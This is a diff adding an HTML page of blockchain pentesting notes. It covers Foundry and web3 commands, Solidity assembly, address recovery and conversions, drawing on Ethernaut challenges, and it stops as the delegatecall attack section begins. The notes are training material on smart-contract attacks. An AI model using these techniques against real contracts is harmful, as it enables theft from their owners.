@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Blockchain Pentesting - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Blockchain Pentesting", url: "#_top", children: [
+          ]},
+          {title: "Interact with Ethereum using Foundry", url: "#interact-with-ethereum-using-foundry", children: [
+          ]},
+          {title: "Interact with Ethereum using Python", url: "#interact-with-ethereum-using-python", children: [
+              {title: "Interact with Ethereum Chain", url: "#interact-with-ethereum-chain" },
+          ]},
+          {title: "Compile, Deploy, Run Smart Contract", url: "#compile-deploy-run-smart-contract", children: [
+          ]},
+          {title: "Solidity Assembly", url: "#solidity-assembly", children: [
+          ]},
+          {title: "Solidity Contract Address Recovery", url: "#solidity-contract-address-recovery", children: [
+          ]},
+          {title: "Solidity Conversion", url: "#solidity-conversion", children: [
+          ]},
+          {title: "Solidity Delegatecall Attack", url: "#solidity-delegatecall-attack", children: [
+          ]},
+          {title: "Solidity Denial of Service Attack", url: "#solidity-denial-of-service-attack", children: [
+          ]},
+          {title: "Solidity Overflow \u0026amp; Underflow", url: "#solidity-overflow-underflow", children: [
+          ]},
+          {title: "Solidity Reentrancy Attack", url: "#solidity-reentrancy-attack", children: [
+          ]},
+          {title: "Solidity Self Destruct Attack", url: "#solidity-self-destruct-attack", children: [
+          ]},
+          {title: "Solidity Smart Contract Attack Methodology", url: "#solidity-smart-contract-attack-methodology", children: [
+          ]},
+          {title: "Solidity Storage Values Analysis", url: "#solidity-storage-values-analysis", children: [
+          ]},
+          {title: "Solidity Tx Origin Attack", url: "#solidity-tx-origin-attack", children: [
+          ]},
+          {title: "Web3.js Cheat Sheet", url: "#web3js-cheat-sheet", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="blockchain-pentesting">Blockchain Pentesting</h1>
+<p>A type of Digital Ledger Technology (DLT) that consists of growing list of records, called blocks, that are securely linked together using cryptography.</p>
+<ul>
+<li>
+<p>Explore Transactions</p>
+</li>
+<li>
+<p><a href="https://www.blockchain.com/explorer">blockchain.com</a></p>
+<p>The most popular and trusted block explorer and crypto transaction search engine.</p>
+</li>
+<li>
+<p><a href="https://blockexplorer.com/">Block Explorer</a></p>
+<p>The Handshake Block Explorer.</p>
+</li>
+<li>
+<p><a href="https://www.etherchain.org/">etherchain.org</a></p>
+<p>The Ethereum blockchain explorer.</p>
+</li>
+<li>
+<p><a href="https://oxt.me/">OXT</a></p>
+</li>
+<li>
+<p>Explore Wallets</p>
+</li>
+<li>
+<p><a href="https://www.walletexplorer.com/">Wallet Explorer</a></p>
+</li>
+</ul>
+<h1 id="interact-with-ethereum-using-foundry">Interact with Ethereum using Foundry</h1>
+<p>Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust. </p>
+<ul>
+<li>Setup Foundry</li>
+</ul>
+<p>Please refer to the <a href="https://github.com/foundry-rs/foundry">Foundry's repository</a> for details.<br />
+To install <strong><code>foundryup</code></strong>, run the following command to install <strong>foundry</strong> toolchain.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>curl -L https://foundry.paradigm.xyz | bash
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>foundryup
+</span></code></pre></div>
+<p>We can set the environment variable for <strong>Ethereum RPC URL</strong> to interact the Ethereum blockchain so that we don’t need to set the RPC url flag when running each command.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>export ETH_RPC_URL=&quot;http://10.0.0.1:12345/path/to/rpc&quot;
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Investigating a Chain</li>
+</ul>
+<p><strong><code>cast</code></strong> command of Foundry performs Ethereum RPC calls.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a># Get the Ethereum chain id
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>cast chain-id
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a># Get the symbolic name of the current chain
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>cast chain
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a># Get the current client version
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>cast client
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a># Get the current gas price
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>cast gas-price
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a># Get the latest block number
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>cast block-number
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a># Get information about a block
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>cast block
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Investigating Account</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a># Get the balance of an account in wei
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>cast balance &lt;account_address or ens_name&gt;
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>cast balance 0x123...
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>cast balance beer.eth
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Investigating Contract</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a># Get the source code of a contract from Etherscan
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>cast etherscan-source &lt;contract_address&gt;
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>cast etherscan-source 0x123...
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Send Transactions</li>
+</ul>
+<p>We can interact with the contract that is already deployed in Ethereum chain if we have the private key of the account and the contract address.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a># Call the function of the contract
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>cast send --private-key &lt;private_key_addr&gt; &lt;contract_addr&gt; &quot;exampleFunc(uint256)&quot; &lt;argument_value_of_the_function&gt;
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>cast send --private-key 0x123... 0xabc... &quot;deposit(uint256)&quot; 10
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a># Trigger the fallback function
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a># Call the nonexisting function e.g. &quot;dummy&quot;
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>cast send --private-key &lt;private_key_addr&gt; &lt;contract_addr&gt; &quot;dummy()&quot;
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>cast send --private-key 0x123... 0xabc... &quot;dummy()&quot;
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a># Trigger the receive function
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a># Send Ether to call the receive function
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>cast send --private-key &lt;private_key_addr&gt; &lt;contract_addr&gt; --value 10gwei
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>cast send --private-key 0x123... 0xabc... --value 10gwei
+</span></code></pre></div>
+<h1 id="interact-with-ethereum-using-python">Interact with Ethereum using Python</h1>
+<ul>
+<li>Preparation</li>
+</ul>
+<p>To use <strong>“py-solc”</strong>, the Ethereum and Solidity are required in our system. So if you don’t have them yet, install them.</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">sudo</span> <span class="n">add</span><span class="o">-</span><span class="n">apt</span><span class="o">-</span><span class="n">repository</span> <span class="n">ppa</span><span class="p">:</span><span class="n">ethereum</span><span class="o">/</span><span class="n">ethereum</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">sudo</span> <span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">update</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">sudo</span> <span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">solc</span>
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Install Python Packages</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>pip3 install py-solc
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>pip3 install web3
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Compile Contract</li>
+</ul>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="kn">import</span> <span class="nn">solc</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;MyContract.sol&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>    <span class="n">contract_source_code</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="n">compiled_sol</span> <span class="o">=</span> <span class="n">solc</span><span class="o">.</span><span class="n">compile_source</span><span class="p">(</span><span class="n">contract_source_code</span><span class="p">)</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="n">contract_bytecode</span> <span class="o">=</span> <span class="n">compiled_sol</span><span class="p">[</span><span class="s1">&#39;&lt;stdin&gt;:MyContract&#39;</span><span class="p">][</span><span class="s1">&#39;bin&#39;</span><span class="p">]</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="n">contract_abi</span> <span class="o">=</span> <span class="n">compiled_sol</span><span class="p">[</span><span class="s1">&#39;&lt;stdin&gt;:MyContract&#39;</span><span class="p">][</span><span class="s1">&#39;abi&#39;</span><span class="p">]</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="interact-with-ethereum-chain">Interact with Ethereum Chain</h2>
+<p>Create the Python script using web3 to interact with blockchain.</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">rpc_url</span> <span class="o">=</span> <span class="s2">&quot;http://10.0.0.1:8545&quot;</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="n">private_key</span> <span class="o">=</span> <span class="s2">&quot;0x1234...&quot;</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="n">addr</span> <span class="o">=</span> <span class="s2">&quot;0x1234...&quot;</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="n">contract_addr</span> <span class="o">=</span> <span class="s2">&quot;0x1234...&quot;</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="c1"># Connect</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">HTTPProvider</span><span class="p">(</span><span class="n">rpc_url</span><span class="p">))</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="nb">print</span><span class="p">(</span><span class="n">w3</span><span class="o">.</span><span class="n">is_connected</span><span class="p">())</span>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="c1"># Get the latest block</span>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="nb">print</span><span class="p">(</span><span class="n">w3</span><span class="o">.</span><span class="n">get_block</span><span class="p">(</span><span class="s1">&#39;latest&#39;</span><span class="p">))</span>
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="c1"># Get the balance of specified address</span>
+</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="n">balance</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Balance is </span><span class="si">{</span><span class="n">balance</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<h1 id="compile-deploy-run-smart-contract">Compile, Deploy, Run Smart Contract</h1>
+<p>When we created smart contract, we need to compile it and deploy to Ethereum. There are various way to do that.</p>
+<ul>
+<li>Ethereum Remix Extension in VS Code</li>
+</ul>
+<p><a href="https://marketplace.visualstudio.com/items?itemName=RemixProject.ethereum-remix">Ethereum Remix</a> extension is <strong>the VS Code plugin</strong> that can perform a variety of tasks such as verifying contracts.</p>
+<ul>
+<li>
+<ol>
+<li>Connect</li>
+</ol>
+</li>
+</ul>
+<p>In the left pane, click Explorer tab and open the <strong>"REMIX"</strong> field at the bottom. Then choose <strong>"Run &amp; Deploy"</strong> and select <strong>"Activate"</strong>. The <strong>"Run &amp; Deploy"</strong> window opens.<br />
+In Connection field, enter the address and click Connect.</p>
+<ul>
+<li>
+<ol>
+<li>Compile</li>
+</ol>
+</li>
+</ul>
+<p>Next, select the file you want to compile, and click Compile.</p>
+<ul>
+<li>
+<ol>
+<li>Deploy</li>
+</ol>
+</li>
+</ul>
+<p>After compiling, select the contract you want to deploy, then click Deploy.</p>
+<ul>
+<li>
+<ol>
+<li>Run</li>
+</ol>
+</li>
+</ul>
+<p>If deploying the contract successfully, we can see functions of the contract.<br />
+Click <strong>TRANSACT</strong> or <strong>CALL</strong> at the function you want to.<br />
+After that, we can see the output at the bottom.</p>
+<h1 id="solidity-assembly">Solidity Assembly</h1>
+<p>[Reference]</p>
+<ul>
+<li><a href="https://docs.soliditylang.org/en/latest/assembly.html">soliditylang</a></li>
+<li>
+<p><a href="https://blog.dixitaditya.com/ethernaut-level-18-magicnumber">ethernaut-level-18-magicnumber</a></p>
+</li>
+<li>
+<p>Simple Example</p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>pragma solidity ^0.8.0;
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>contract Simple {
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>    constructor(address _addr) {
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>        assembly {
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>            // Get the size of the code
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>            let size := extcodesize(_addr);
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>            // Allocate output byte array
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>            code := mload(0x40);
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>            // New &quot;memory end&quot; including padding
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))));
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>            // Store length in memory
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>            mstore(code, size);
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>            // Retrieve the code
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>            extcodecopy(addr, add(code, 0x20), 0, size);
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>        }
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>    }
+</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>}
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>From Opcode</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>pragma solidity ^0.8.0;
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>contract Opcode {
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>  constructor() {
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>        address myContract;
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>    bytes memory opcode = &quot;\x60\x0a\x60\x0c\x60\x00\x39\x60\x0a\x60\x00\xf3\x60\x2a\x60\x80\x52\x60\x20\x60\x80\xf3&quot;;
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>    assembly {
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>        myContract := create(0, add(opcode, 0x20), mload(opcode))
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>    }
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>    // Some code here...
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>  }
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>}
+</span></code></pre></div>
+<h1 id="solidity-contract-address-recovery">Solidity Contract Address Recovery</h1>
+<p>[Reference]</p>
+<ul>
+<li><a href="https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed">ethereum.stackexchange</a></li>
+<li>
+<p><a href="https://blog.dixitaditya.com/ethernaut-level-17-recovery">ethernaut-level-17-recovery</a></p>
+</li>
+<li>
+<p>Create a Contract for Recovery Address</p>
+</li>
+</ul>
+<p>This contract can compute the contract address which has been lost.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>// SPDX-License-Identifier: MIT
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>pragma solidity ^0.8.0;
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>contract ContractRecovery {
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>    constructor(address _creatorAddress) {
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>        address lostAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creatorAddress), bytes1(0x01))))));
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>        // some code here ...
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>    }
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>}
+</span></code></pre></div>
+<p>Another way is to use <a href="https://etherscan.io/">Etherscan</a> transaction history.</p>
+<h1 id="solidity-conversion">Solidity Conversion</h1>
+<p>[Reference]</p>
+<ul>
+<li><a href="https://www.tutorialspoint.com/solidity/solidity_conversions.htm">solidity_conversions</a></li>
+<li>
+<p><a href="https://coinsbench.com/12-privacy-ethernaut-explained-8ee480f303f2">12-privacy-ethernaut-explained</a></p>
+</li>
+<li>
+<p>Explicit Conversion</p>
+</li>
+</ul>
+<p>When we cast a smaller type to a bigger type, there's no problem. However, when we cast a bigger type to a smaller type, data may be lost partially.</p>
+<ul>
+<li>Uint/Int</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>// uint32 -&gt; uint16
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>uint32 a = 0x12345678;
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>uint16 b = uint16(a); // 0x5678
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>// uint16 -&gt; uint32
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>uint16 a = 0x1234;
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>uint32 b = uint32(a); // 0x00001234
+</span></code></pre></div>
+<ul>
+<li>Bytes</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>// bytes2 -&gt; bytes1
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>bytes2 a = 0x1234;
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>bytes1 b = bytes1(a); // 0x12
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>// bytes2 -&gt; bytes4
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>bytes2 a = 0x1234;
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>bytes4 b = bytes4(a); // 0x12340000
+</span></code></pre></div>
+<h1 id="solidity-delegatecall-attack">Solidity Delegatecall Attack</h1>
+<p>Solidity’s delegatecall is vulnerable to override the storage values in the caller contract.</p>
+<ul>
+<li>
+<p><a href="https://ethernaut.openzeppelin.com/level/0xF781b45d11A37c51aabBa1197B61e6397aDf1f78">ethernaut.openzeppelin</a></p>
+</li>
+<li>
+<p>Exploitation</p>
+</li>
+</ul>
+<p>Reference: <a href="https://github.com/Macmod/ethernaut-writeups/blob/master/4-delegation.md">https://github.com/Macmod/ethernaut-writeups/blob/master/4-delegation.md</a></p>
+<ul>
+<li>
+<ol>
+<li>Vulnerable Contract</li>
+</ol>
+</li>
+</ul>
+<p>Below is the example contracts from <strong>Ethernaut</strong>. That uses <code>delegatecall</code> method in the <code>fallback()</code> function.</p>
